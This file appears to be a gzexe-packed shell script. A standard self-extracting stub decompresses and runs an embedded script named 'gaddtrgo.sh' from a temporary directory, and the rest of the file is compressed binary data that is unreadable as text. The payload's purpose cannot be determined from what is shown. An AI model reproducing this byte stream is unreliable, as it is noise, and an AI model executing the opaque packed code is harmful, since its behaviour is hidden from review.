#!/bin/sh
skip=49

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | /*/) ;;
  /*) TMPDIR=$TMPDIR/;;
  *) TMPDIR=/tmp/;;
esac
if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
else
  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
�0ǲgaddtrgo.sh �T�v�F}f�b��N*��۞�Gi(������:����6�]UZj�C����,�����̝ٹwf�z��
�ܲdI�0������*T1��.���V�}�:o���d�}�ǟ����ߣi<�������_��%�)Z�ˉ7,�~@[��S��#Z����������D�k-䂼�x���n�5��m��s��Q�p��v��_!~����F�&���/��y��
"�p���������,�́Z���޺O�{<^�$JB��y�y�l6S%<L��8lC9�K���,��:�m���_���aҭ��"sA����l6"@n>��p�;:V����1�����5�xyQ
7��fB��1�9���1x�<��Fj�t�&�1�������ܱߵ�n�[P��uo�z����V=�5P�R�9��#���l����m�P�����w��_���Ba�|���،����+�J6(�XՋr�>eI�i/���w0�f��C�ݥR��H�y�,���	�P�J�$'_���F"�<�`����^����s���Pwh�R�t���r���2�b,��%𕜋E�S�pL���1`��`ǋ������+�xm�#Y�X)J��S�B�j�����m(�|�T3H�K4_�:��'��
@��>'��+&.-\g��r#��+�>��ً�Ӷ�s�5���EܽKjK��9bz��,T�K?�E��+��L�����a��4�l2��3��c;��0�f�*|��	ۗ��y�E=���Qvw� )���K O�V��4�%����I�6B�ܽ�.��rZT�-*�8�xq��('ϧ6��?���S���0��*#g������L4?JN�N�
IO�����V��Vp��D)�\n(1o�/���RD  